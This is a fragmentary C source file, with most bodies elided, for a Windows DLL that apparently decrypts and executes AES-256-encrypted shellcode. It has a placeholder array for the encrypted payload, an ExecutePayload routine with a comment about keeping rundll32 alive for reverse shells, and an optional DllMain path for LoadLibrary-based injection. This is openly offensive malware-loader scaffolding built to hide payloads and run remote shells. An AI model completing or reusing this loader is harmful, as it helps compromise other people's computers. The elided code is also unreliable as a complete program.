...
// ============================================================
// !! REPLACE THIS ARRAY with output from encrypt_aes256.py !!
// The embedded payload below is placeholder demo data.
// It MUST be re-encrypted with the key+IV above.
// ============================================================
static const unsigned char kEncryptedShellcode[] = {
    OUTPUT FROM encrypt_aes256.py
};
...
static DWORD ExecutePayload(LPVOID shellcode, DWORD size) {
    ...
    // For long-lived reverse shells this keeps the rundll32 host alive.
...
// ============================================================
// Decrypt and execute payload — NEVER call from DllMain
// ============================================================
...
// Optional: fire-and-forget via LoadLibrary (no rundll32 needed)
...
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    ...
    if (reason == DLL_PROCESS_ATTACH) {
        ...
        // Uncomment ONLY for LoadLibrary-based injection (no export call):
